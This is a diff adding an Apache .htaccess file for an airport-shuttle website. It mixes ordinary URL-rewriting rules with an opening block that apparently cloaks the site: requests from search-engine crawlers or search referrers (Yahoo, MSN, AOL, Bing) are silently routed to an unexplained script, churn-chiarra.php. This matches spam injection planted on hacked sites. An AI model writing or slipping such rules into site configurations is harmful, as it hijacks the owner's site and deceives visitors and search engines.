@@ -1,0 +1,17 @@
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ churn-chiarra.php?$1 [L,QSA]
+
+Options -MultiViews
+RewriteEngine On
+
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule ^([^\.]+)$ $1.php [NC,L]
+
+RewriteCond %{http_host} ^alohaairportshuttle.com [NC]
+RewriteRule ^(.*)$ http://www.alohaairportshuttle.com/$1 [R=301,L] 
